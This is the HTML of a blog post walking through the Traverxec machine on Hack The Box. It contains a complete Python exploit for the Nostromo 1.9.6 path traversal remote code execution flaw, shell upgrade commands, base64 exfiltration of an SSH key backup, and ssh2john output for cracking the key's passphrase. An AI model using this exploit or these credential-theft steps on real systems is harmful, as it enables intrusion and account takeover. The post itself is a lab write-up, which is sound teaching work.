@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Traverxec Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="This is a Writeup for Traverxec it is Linux Machine on hack the box, in Traverxec we&#x27;ll learn about exploiting nostromo server for inital access.">
+    <link rel="canonical" href="https://sheerazali.com/blog/traverxec-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Traverxec Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="This is a Writeup for Traverxec it is Linux Machine on hack the box, in Traverxec we&#x27;ll learn about exploiting nostromo server for inital access.">
+    <meta property="og:url" content="https://sheerazali.com/blog/traverxec-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/12/Mark-Your-Calendars-1.png?fit&#x3D;1167%2C657&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2019-12-10T10:27:01.000Z">
+    <meta property="article:modified_time" content="2020-04-11T02:19:05.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Traverxec Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="This is a Writeup for Traverxec it is Linux Machine on hack the box, in Traverxec we&#x27;ll learn about exploiting nostromo server for inital access.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/traverxec-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/12/Mark-Your-Calendars-1.png?fit&#x3D;1167%2C657&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1167">
+    <meta property="og:image:height" content="657">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Traverxec Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/traverxec-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2019-12-10T10:27:01.000Z",
+    "dateModified": "2020-04-11T02:19:05.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/12/Mark-Your-Calendars-1.png?fit=1167%2C657&ssl=1",
+        "width": 1167,
+        "height": 657
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "This is a Writeup for Traverxec it is Linux Machine on hack the box, in Traverxec we&#x27;ll learn about exploiting nostromo server for inital access.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/traverxec-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">December 10, 2019</span>
+        <span class="reading-time">7 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Traverxec Writeup / Walkthrough Hack the box">Traverxec Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/12/Mark-Your-Calendars-1.png?fit&#x3D;1167%2C657&amp;ssl&#x3D;1" alt="Traverxec Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Traverxec Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h2 id="traverxec-writeup-summery">Traverxec writeup Summery</h2><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2019_12_1.png" class="kg-image" alt="Traverxec " loading="lazy" width="579" height="363"><figcaption>Traverxec write up Hack the box</figcaption></figure><h2 id="tldr">TL;DR</h2><p>This Writeup is about <a href="//www.hackthebox.eu/home/machines/profile/217">Traverxec</a>, on hack the box. It was a Linux box. It starts off with a public exploit on Nostromo web server for the initial foothold. Then we enumerate and find a directory readable by www-data inside a david users home directory there we find a ssh key we bruteforce it’s passphrase ssh as david. we find a server-start.sh in davids home directory and we use gtfobin’s to get root.</p><h2 id="walkthrough">Walkthrough</h2><h2 id="scanning-network">Scanning Network</h2><p>I did an initial Nmap scan but there is a catch this time. I know a lot of us are preparing for OSCP. i was looking at recommended tools for OSCP and I found <a href="//github.com/21y4d/nmapAutomator">Nmap Automater</a>. This tool is for automating recon on OSCP machines. It did a quick Nmap scan than it did another full port scan including UDP scan and more just doing an “ALL” option does all types of scans such as nikto and even gobuster. Although I didn’t find anything with a full port scan however now you know another good tool to automate recon.</p><p>So let’s look up our Nmap results.</p><pre><code class="language-bash">┌─[root@parrot]─[/home/user/Desktop/htb/HackTheBox-Machines/Traverxec]
+└──╼ #cat 10.10.10.165/nmap/Basic_10.10.10.165.nmap 
+# Nmap 7.70 scan initiated Fri Nov 22 11:06:51 2019 as: nmap -Pn -sCV -p22,80 -oN nmap/Basic_10.10.10.165.nmap 10.10.10.165
+Nmap scan report for 10.10.10.165
+Host is up (0.15s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
+80/tcp open  http    nostromo 1.9.6
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Nov 22 11:07:10 2019 -- 1 IP address (1 host up) scanned in 18.84 seconds</code></pre><p>We have port <strong>22</strong> and <strong>80</strong> open on Traverxec.</p><h2 id="getting-a-web-shell-with-nostromo">Getting a Web Shell with Nostromo</h2><p>Although we can see Nmap has pulled up  <strong>Nostromo 1.9.6</strong> from the headers but I checked if there is something on the website although there was nothing but a template for a user named David and his portfolio website.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2019_12_2-1024x515.png" class="kg-image" alt="Traverxec port 80" loading="lazy" width="770" height="387"><figcaption>Traverxec port 80</figcaption></figure><p>after looking around I couldn’t find anything and eventually, I opened up burp and intercepted the website and found there was server’s banner and version on burp’s response.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2019_12_3.png" class="kg-image" alt="Traverxec Server Header" loading="lazy" width="770" height="358"><figcaption>Traverxec Server Header</figcaption></figure><p>As I clearly ignored  <strong>Nostromo 1.9.6</strong>  in my Nmap results this was a new finding and I started finding if there are any public exploits for this version of Nostromo. I found this exploit a directory traversal RCE you can read more about the vulnerability here. <a href="//www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html">https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html</a> . This is the exploit script I used.</p><pre><code class="language-python">#!/usr/bin/env python
+
+import socket
+import argparse
+
+parser = argparse.ArgumentParser(description='RCE in Nostromo web server through 1.9.6 due to path traversal.')
+parser.add_argument('host',help='domain/IP of the Nostromo web server')
+parser.add_argument('port',help='port number',type=int)
+parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
+args = parser.parse_args()
+
+def recv(s):
+	r=''
+	try:
+		while True:
+			t=s.recv(1024)
+			if len(t)==0:
+				break
+			r+=t
+	except:
+		pass
+	return r
+def exploit(host,port,cmd):
+	s=socket.socket()
+	s.settimeout(1)
+	s.connect((host,int(port)))
+	payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2&gt;&amp;1""".format(cmd)
+	s.send(payload)
+	r=recv(s)
+	r=r[r.index('\r\n\r\n')+4:]
+	print r
+
+exploit(args.host,args.port,args.cmd)</code></pre><p>Then I began to exploit this vulnerability and got a shell back, as always I did some housekeeping with the shell to get a better shell.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2019_12_4-1024x387.png" class="kg-image" alt="web Shell" loading="lazy" width="588" height="222"><figcaption>Traverxec Shell</figcaption></figure><p>To get a better shell I used than I pressed <strong>Ctrl + z</strong> to background the shell after that I used and <strong>stty raw -echo </strong>. after this I pressed <strong>fg</strong> on the shell to foreground the process and now I can use arrow buttons and tab-complete.</p><pre><code class="language-bash">python -c 'import pty;pty.spawn("/bin/bash")';
+ctrl+z
+stty raw -echo 
+fg </code></pre><h2 id="user-on-traverxec">User on Traverxec</h2><p>So I got in Traverxec as www-data and I ran LinEnum and didn’t found anything. The first thing that made sense was to look in Traverxec’s directory to look for config files to find credentials. So I checked the directory<strong> /var/nostromo/conf</strong>. I found this in  LinEnum’s output and this was found as readable www-data so we will look at <strong>nhttpd.conf</strong> file.</p><pre><code class="language-bash">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
+# MAIN [MANDATORY]
+servername		traverxec.htb
+serverlisten		*
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+# LOGS [OPTIONAL]
+logpid			logs/nhttpd.pid
+# SETUID [RECOMMENDED]
+user			www-data
+# BASIC AUTHENTICATION [OPTIONAL]
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+# ALIASES [OPTIONAL]
+/icons			/var/nostromo/icons
+# HOMEDIRS [OPTIONAL]
+homedirs		/home
+homedirs_public		public_www</code></pre><p>when I read the config file it looked like there is a public_www directory inside a /home but we can’t read the David but it seems like there is a public_www inside David’s home directory. so I tried to cd into /<strong>home/david/public_www/</strong> and I got in we have permissions public_www. there is a folder named<strong> /protected-file-area</strong> inside public_www and inside it is a tar archive called “<strong>backup-ssh-identity-files.tgz”</strong>. So I downloaded it to my machine.</p><pre><code class="language-bash">www-data@traverxec:/home/david/public_www/protected-file-area$ base64 backup-ssh-identity-files.tgz
+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
+
+┌─[root@parrot]─[/home/user/Desktop/htb/HackTheBox-Machines/Traverxec]
+└──╼ #echo "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" | base64 -d &gt; sshbackup.tgz</code></pre><p>I used base64 for transferring the file to my computer by encoding it on traverexec and decoding it in my computer with base64 -d and unzipping the file. Found David’s home directory and inside we found there was .ssh folder inside of  David’s directory. I tried to ssh in as David but the ssh key is encrypted. I Bruteforced the passphrase for David’s key, with SSH2John to create a hash of David’s key. Read this for more details on this method <a href="https://sheerazali.com/heist-writeup-hack-the-box/">Heist Writeup</a>.</p><pre><code class="language-bash">⚡ root@parrot HackTheBox-Machines/Traverxec   master  /opt/JohnTheRipper/run/ssh2john.py id_rsa &gt; ../../../DavidsKeyHash
+⚡ root@parrot HackTheBox-Machines/Traverxec   master  cat DavidsKeyHash
+id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d